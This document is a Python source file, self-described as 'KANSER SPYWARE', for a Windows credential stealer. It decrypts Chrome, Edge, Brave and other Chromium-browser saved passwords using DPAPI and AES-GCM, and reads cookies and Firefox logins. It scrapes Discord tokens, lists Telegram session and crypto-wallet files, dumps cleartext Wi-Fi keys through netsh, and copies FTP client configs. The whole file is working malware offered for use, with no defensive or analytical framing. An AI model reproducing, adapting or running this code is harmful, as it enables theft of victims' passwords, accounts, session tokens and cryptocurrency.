#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
KANSER SPYWARE — Credential Stealer
Browser passwords, tokens, wallets, FTP clients, email, WiFi
"""
import os, sys, json, base64, sqlite3, shutil, tempfile, re, subprocess

class Stealer:
    def steal_all(self):
        results = {}
        results["browsers"] = self._steal_browsers()
        results["discord"] = self._steal_discord()
        results["telegram"] = self._steal_telegram()
        results["wallets"] = self._steal_wallets()
        results["wifi"] = self._steal_wifi()
        results["ftp"] = self._steal_ftp_clients()
        results["email"] = self._steal_email()
        results["vpn"] = self._steal_vpn()
        return results

    def _steal_browsers(self):
        browsers = {}
        chrome_paths = {
            "Chrome": os.path.join(os.getenv("LOCALAPPDATA", ""), "Google", "Chrome", "User Data"),
            "Edge": os.path.join(os.getenv("LOCALAPPDATA", ""), "Microsoft", "Edge", "User Data"),
            "Brave": os.path.join(os.getenv("LOCALAPPDATA", ""), "BraveSoftware", "Brave-Browser", "User Data"),
            "Opera": os.path.join(os.getenv("APPDATA", ""), "Opera Software", "Opera Stable"),
            "OperaGX": os.path.join(os.getenv("APPDATA", ""), "Opera Software", "Opera GX Stable"),
            "Vivaldi": os.path.join(os.getenv("LOCALAPPDATA", ""), "Vivaldi", "User Data"),
            "Chromium": os.path.join(os.getenv("LOCALAPPDATA", ""), "Chromium", "User Data"),
        }
        for name, path in chrome_paths.items():
            if os.path.exists(path):
                browsers[name] = self._extract_chromium(path)
        
        firefox_path = os.path.join(os.getenv("APPDATA", ""), "Mozilla", "Firefox", "Profiles")
        if os.path.exists(firefox_path):
            browsers["Firefox"] = self._extract_firefox(firefox_path)
        
        return browsers

    def _extract_chromium(self, base):
        try:
            key = None
            local_state = os.path.join(base, "Local State")
            if os.path.exists(local_state):
                with open(local_state, "r", encoding="utf-8") as f:
                    state = json.loads(f.read())
                encrypted_key = base64.b64decode(state.get("os_crypt", {}).get("encrypted_key", ""))
                if encrypted_key and encrypted_key.startswith(b"DPAPI"):
                    import ctypes, ctypes.wintypes
                    encrypted_key = encrypted_key[5:]
                    class DATA_BLOB(ctypes.Structure):
                        _fields_ = [("cbData", ctypes.wintypes.DWORD), ("pbData", ctypes.POINTER(ctypes.c_char))]
                    blob_in = DATA_BLOB(len(encrypted_key), ctypes.cast(encrypted_key, ctypes.POINTER(ctypes.c_char)))
                    blob_out = DATA_BLOB()
                    if ctypes.windll.crypt32.CryptUnprotectData(ctypes.byref(blob_in), None, None, None, None, 0, ctypes.byref(blob_out)):
                        key = ctypes.string_at(blob_out.pbData, blob_out.cbData)
                        ctypes.windll.kernel32.LocalFree(blob_out.pbData)
        except: pass

        profiles = [d for d in os.listdir(base) if d.startswith("Profile") or d == "Default"]
        results = []
        for profile in profiles:
            login_db = os.path.join(base, profile, "Login Data")
            cookie_db = os.path.join(base, profile, "Network", "Cookies")
            if os.path.exists(login_db):
                try:
                    tmp = tempfile.mktemp(suffix=".db")
                    shutil.copy2(login_db, tmp)
                    conn = sqlite3.connect(tmp)
                    conn.text_factory = bytes
                    cursor = conn.cursor()
                    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                    for row in cursor.fetchall():
                        url, user, pw = row
                        pw_dec = self._decrypt_chrome(pw, key)
                        results.append({"url": url.decode() if isinstance(url, bytes) else url, "user": user.decode() if isinstance(user, bytes) else user, "pass": pw_dec, "profile": profile})
                    conn.close(); os.remove(tmp)
                except: pass

            if os.path.exists(cookie_db):
                try:
                    tmp = tempfile.mktemp(suffix=".db")
                    shutil.copy2(cookie_db, tmp)
                    conn = sqlite3.connect(tmp)
                    conn.text_factory = bytes
                    cursor = conn.cursor()
                    cursor.execute("SELECT host_key, name, encrypted_value FROM cookies LIMIT 100")
                    for row in cursor.fetchall():
                        host, name, val = row
                        results.append({"host": host.decode() if isinstance(host, bytes) else str(host), "cookie_name": name.decode() if isinstance(name, bytes) else str(name), "cookie_val": str(val)[:50], "profile": profile})
                    conn.close(); os.remove(tmp)
                except: pass
        return results[:100]

    def _extract_firefox(self, profile_dir):
        results = []
        for profile in os.listdir(profile_dir):
            db = os.path.join(profile_dir, profile, "logins.json")
            if os.path.exists(db):
                try:
                    with open(db, "r", encoding="utf-8") as f:
                        data = json.loads(f.read())
                    for entry in data.get("logins", []):
                        results.append({"url": entry.get("hostname", ""), "user": entry.get("encryptedUsername", ""), "pass": entry.get("encryptedPassword", "")[:50], "firefox": True})
                except: pass
        return results[:50]

    def _decrypt_chrome(self, data, key):
        if not data: return ""
        try:
            if data.startswith(b"v10") or data.startswith(b"v11"):
                data = data[3:]
                from cryptography.hazmat.primitives.ciphers.aead import AESGCM
                nonce, ciphertext = data[:12], data[12:]
                aesgcm = AESGCM(key)
                return aesgcm.decrypt(nonce, ciphertext, None).decode(errors="ignore")
            elif data.startswith(b"v20"):
                data = data[3:]
                from cryptography.hazmat.primitives.ciphers.aead import AESGCM
                nonce, ciphertext = data[:12], data[12:]
                aesgcm = AESGCM(key)
                return aesgcm.decrypt(nonce, ciphertext, None).decode(errors="ignore")
        except: pass
        return str(data)[:50]

    def _steal_discord(self):
        results = {"tokens": [], "found": False}
        base = os.path.join(os.getenv("APPDATA", ""), "discord", "Local Storage", "leveldb")
        if not os.path.exists(base): return results
        results["found"] = True
        for f in os.listdir(base):
            if f.endswith(".ldb") or f.endswith(".log"):
                try:
                    with open(os.path.join(base, f), "r", encoding="utf-8", errors="ignore") as ff:
                        content = ff.read()
                    # Discord token regex (v2 format)
                    tokens = re.findall(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', content)
                    tokens += re.findall(r'mfa\.[\w-]{84}', content)
                    for t in tokens:
                        if t not in results["tokens"]:
                            results["tokens"].append(t)
                except: pass
        return results

    def _steal_telegram(self):
        results = {"found": False, "sessions": []}
        base = os.path.join(os.getenv("APPDATA", ""), "Telegram Desktop", "tdata")
        if not os.path.exists(base): return results
        results["found"] = True
        for f in os.listdir(base):
            if f.startswith("D") or f.startswith("map") or f == "key_datas":
                results["sessions"].append(f)
        return results

    def _steal_wallets(self):
        wallets = {
            "MetaMask": os.path.join(os.getenv("LOCALAPPDATA", ""), "Google", "Chrome", "User Data"),
            "Exodus": os.path.join(os.getenv("APPDATA", ""), "Exodus"),
            "Electrum": os.path.join(os.getenv("APPDATA", ""), "Electrum", "wallets"),
            "Bitcoin Core": os.path.join(os.getenv("APPDATA", ""), "Bitcoin"),
            "Atomic": os.path.join(os.getenv("APPDATA", ""), "atomic"),
            "Guarda": os.path.join(os.getenv("APPDATA", ""), "Guarda"),
            "Coinomi": os.path.join(os.getenv("APPDATA", ""), "Coinomi"),
            "Wasabi": os.path.join(os.getenv("APPDATA", ""), "WalletWasabi"),
        }
        results = {}
        for name, path in wallets.items():
            if os.path.exists(path):
                try:
                    files = []
                    for root, dirs, files_list in os.walk(path):
                        for f in files_list:
                            fp = os.path.join(root, f)
                            if os.path.getsize(fp) < 5 * 1024 * 1024:
                                files.append({"name": f, "path": fp, "size": os.path.getsize(fp)})
                    results[name] = {"found": True, "files": files[:20]}
                except: results[name] = {"found": True, "error": "access denied"}
            else:
                results[name] = {"found": False}
        return results

    def _steal_wifi(self):
        results = []
        try:
            if os.name == "nt":
                out = subprocess.check_output("netsh wlan show profiles", shell=True, timeout=5).decode(errors="ignore", encoding="utf-8")
                profiles = re.findall(r':\s*(.+)$', out, re.MULTILINE)
                for p in profiles:
                    p = p.strip()
                    try:
                        detail = subprocess.check_output(f'netsh wlan show profile "{p}" key=clear', shell=True, timeout=5).decode(errors="ignore", encoding="utf-8")
                        key_match = re.search(r'Key Content\s*:\s*(.+)', detail)
                        key = key_match.group(1).strip() if key_match else "[OPEN]"
                        results.append({"ssid": p, "key": key})
                    except: pass
        except: pass
        return results

    def _steal_ftp_clients(self):
        results = {}
        ftp_clients = {
            "FileZilla": os.path.join(os.getenv("APPDATA", ""), "FileZilla", "recentservers.xml"),
            "WinSCP": os.path.join(os.getenv("APPDATA", ""), "WinSCP.ini"),
        }
        for name, path in ftp_clients.items():
            if os.path.exists(path):
                try:
                    with open(path, "r", encoding="utf-8", errors="ignore") as f:
                        results[name] = f.read()[:2000]
                except: results[name] = "found_but_locked"
        return results

    def _steal_email(self):
        results = {}
        outlook_paths = [
            os.path.join(os.getenv("LOCALAPPDATA", ""), "Microsoft", "Outlook"),
            os.path.join(os.getenv("APPDATA", ""), "Microsoft", "Outlook"),
        ]
        for p in outlook_paths:
            if os.path.exists(p):
                results["Outlook"] = {"found": True, "path": p}

        thunderbird = os.path.join(os.getenv("APPDATA", ""), "Thunderbird", "Profiles")
        if os.path.exists(thunderbird):
            results["Thunderbird"] = {"found": True, "path": thunderbird}
        return results

    def _steal_vpn(self):
        results = {}
        vpn_paths = {
            "NordVPN": os.path.join(os.getenv("LOCALAPPDATA", ""), "NordVPN"),
            "ProtonVPN": os.path.join(os.getenv("LOCALAPPDATA", ""), "ProtonVPN"),
            "OpenVPN": os.path.join(os.getenv("USERPROFILE", ""), "OpenVPN"),
            "WireGuard": os.path.join(os.getenv("PROGRAMFILES", ""), "WireGuard"),
        }
        for name, path in vpn_paths.items():
            if os.path.exists(path): results[name] = {"found": True}
        return results

if __name__ == "__main__":
    s = Stealer()
    print(json.dumps(s.steal_all(), indent=2))
